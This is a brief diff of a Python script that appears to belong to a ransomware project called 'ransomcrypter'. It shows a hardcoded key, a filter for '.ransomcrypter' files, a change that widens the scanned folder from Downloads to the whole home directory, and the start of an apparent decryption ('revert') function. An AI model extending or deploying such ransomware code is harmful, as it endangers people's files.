@@ -6,7 +6,7 @@ from sys import argv
 from pathlib import Path
 key = "102efd86a2bec382e7945002e53505a7"
 filename_filter = ["*.ransomcrypter"]
-base_path=Path.home() / "Downloads"
+base_path=Path.home()
 def revert(var):
     c=int(len(var)-1)
     msg=''
